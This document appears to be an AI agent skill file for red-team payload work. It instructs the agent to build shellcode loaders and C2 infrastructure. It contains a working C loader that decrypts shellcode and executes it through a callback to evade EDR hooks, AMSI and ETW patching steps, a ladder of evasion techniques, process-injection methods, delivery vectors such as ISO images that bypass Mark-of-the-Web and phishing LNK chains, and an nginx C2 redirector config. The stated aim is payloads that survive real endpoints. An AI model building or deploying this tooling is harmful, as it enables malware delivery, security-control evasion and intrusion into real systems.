---
name: pt-payload
description: Use when building or delivering offensive tooling — shellcode loaders, staged and stageless payloads, process injection, AMSI and ETW handling, payload obfuscation, signed-binary and LOLBin delivery, or standing up C2 redirectors and profiles — including Russian requests (написать пейлоад, лоадер, обход антивируса, C2, инфраструктура). Use when a payload must survive a real endpoint rather than a lab.
version: 1.0.0
author: operator
tags: [offensive, payload, c2, shellcode, evasion, infrastructure]
---

# Payloads, Evasion, and C2 Infrastructure

Two separate problems: **the code** must execute without tripping the endpoint, and **the infrastructure** must carry the traffic without exposing the operator. A perfect loader behind a burned domain is worthless, and vice versa.

Build in `payloads\src\`, output to `payloads\bin\`, test only in `E:\pintest\lab\`.

## Loader skeleton (C, MSVC)

```c
// payloads/src/loader.c — allocate, decrypt, execute. Build: cl /O2 loader.c
#include <windows.h>

// Resource-embedded, encrypted shellcode. Replace with your own staging.
static unsigned char sc[] = { 0x90 /* ... */ };
static const size_t sc_len = sizeof(sc);

int main(void) {
    // 1. Decrypt in place (XOR example — use AES/RC4 with a runtime-derived key)
    for (size_t i = 0; i < sc_len; i++) sc[i] ^= 0x5A;

    // 2. Prefer a non-obvious allocation over RWX
    LPVOID mem = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 1;
    memcpy(mem, sc, sc_len);

    DWORD old = 0;
    VirtualProtect(mem, sc_len, PAGE_EXECUTE_READ, &old);

    // 3. Execute via a callback instead of CreateThread where EDR hooks it
    EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, 0);
    return 0;
}
```

Compile against the installed toolchain: `cl.exe` (VS Build Tools 2026 present) for Windows targets, or cross-compile from WSL with `x86_64-w64-mingw32-gcc -O2 -o loader.exe loader.c`.

## Loader quality ladder

| Level | Technique | Detectability |
|---|---|---|
| 1 | `VirtualAlloc` RWX + `CreateThread` | Signatured everywhere; lab only |
| 2 | RW → `VirtualProtect` → callback execution | Beats naive RWX rules |
| 3 | Encrypted payload, key derived at runtime, string obfuscation | Beats static scanning |
| 4 | Module stomping / DLL hollowing into a signed module | Beats private-memory scans |
| 5 | Sleep obfuscation (encrypt image during sleep), call-stack spoofing | Beats memory scanners during beacon idle |
| 6 | Signed binary + DLL sideload, or a legitimate installer chain | Beats application control |

Do not jump to level 5 before levels 1–3 work. Complexity without a working baseline produces a loader nobody can debug at 3 a.m.

## Injection primitives worth knowing

- `CreateRemoteThread` — dead against modern EDR, still fine in lab
- `QueueUserAPC` / `NtQueueApcThread` — needs an alertable thread
- `SetThreadContext` on a suspended process — classic, heavily hooked
- `Process Hollowing` / `Process Doppelgänging` / `Herpaderping` — file-backed, better telemetry story
- `Thread Pool` (`NtCreateThreadEx` via `TpAllocWork`) — fewer hooks
- `Module stomping` — overwrite a loaded signed DLL's `.text`
- `Early Bird` — APC into a freshly created suspended process before it runs

## AMSI and ETW

These are **per-host adjustments, not a product feature**. Verify each against the actual OS build and Defender version in the lab.

```c
// AMSI: neutralize the scan buffer in the current process (x64)
// 1. LoadLibraryA("amsi.dll"); GetProcAddress("AmsiScanBuffer")
// 2. VirtualProtect the first bytes, write: mov eax, 0x80070057; ret  -> E_INVALIDARG
// 3. Restore protection. Patch again if the module reloads.
```

```c
// ETW: patch EtwEventWrite in ntdll to return immediately (ret)
```

Alternatives that avoid patching entirely: run the payload from an unmonitored context (`.NET` reflection in a non-AMSI process), use `amsi.dll` from a different session, or avoid script hosts altogether by executing compiled code.

**Order of operations:** patch AMSI *before* the first script/assembly load in that process. A patch after the scan is a no-op.

## Delivery

| Vector | Notes |
|---|---|
| ISO / IMG / VHD | Mark-of-the-Web does not propagate into mounted images |
| LNK with `powershell -w hidden` | Still effective, heavily signatured — obfuscate the command line and use a staged fetch |
| MSI (`AlwaysInstallElevated` or user context) | Native installer telemetry, fewer alerts |
| HTA / WSF / JS | Script host is monitored; pair with AMSI handling |
| DLL sideload into a signed EXE | Requires a target app and writable directory; most durable |
| Signed installer + custom action | Legit chain, needs a code-signing cert or a vulnerable installer |
| `.lnk` inside a ZIP with a decoy | Classic phishing chain; RoE must cover it |

Never deliver a payload from your own IP or a domain tied to another engagement.

## C2 infrastructure

```text
Operator -> VPN -> Redirector (nginx/Apache, valid TLS) -> Teamserver/C2
```

Rules that keep infrastructure alive:

- **One client, one infrastructure set.** Domains, certificates, and IPs never reused across engagements.
- **Redirector only forwards C2 paths.** Deny everything else so scanners see a boring site (404), not a login page.
- **Valid TLS on the redirector** — self-signed certs are a beacon in themselves.
- **Categorised domain** — uncategorised new domains are flagged by proxy vendors; check before use and expect ~24–72 h to settle.
- **Profiles:** match the URI, headers, and user-agent to a real product; jitter 20–40%; sleep 60 s+ on long-haul.
- **Kill switch:** a documented, one-command teardown of redirectors and teamserver, plus a list of every active beacon.
- **Logging:** redirector access logs retained, beacon check-in log exported at engagement close — both are evidence of what you did and when.

```nginx
# Redirector: forward only the profile path, deny by default
location /api/v2/updates {
    proxy_pass https://teamserver.internal:8443;
    proxy_set_header Host $host;
    proxy_ssl_verify off;
    proxy_set_header X-Forwarded-For $remote_addr;
}
location / { return 404; }
```

## OPSEC checklist before delivery

- [ ] Payload tested in the lab against the same OS build and AV product as the target
- [ ] No hardcoded operator IPs, hostnames, or client-identifying strings
- [ ] Strings and imports minimized; no debug paths
- [ ] Callback interval and jitter set for the RoE noise level
- [ ] Beacon IDs unique per host, recorded in `notes\timeline.md`
- [ ] Cleanup plan for dropped files, services, scheduled tasks, and registry keys
- [ ] Infra teardown scheduled and documented

## Common mistakes

| Mistake | Reality |
|---|---|
| Level-5 loader with no working level-1 baseline | Nothing to debug against when it fails |
| RWX allocation "just for testing" | Caught before it executes; not a test of the payload |
| AMSI patch after the script runs | The scan already happened |
| Reusing a domain or cert from a previous client | Attribution and contamination risk |
| Self-signed TLS on the redirector | Trivially flagged on the wire |
| No cleanup plan | Persistent access left behind after the engagement |
| Testing only in lab with Defender off | The endpoint is the test environment, not your assumption |
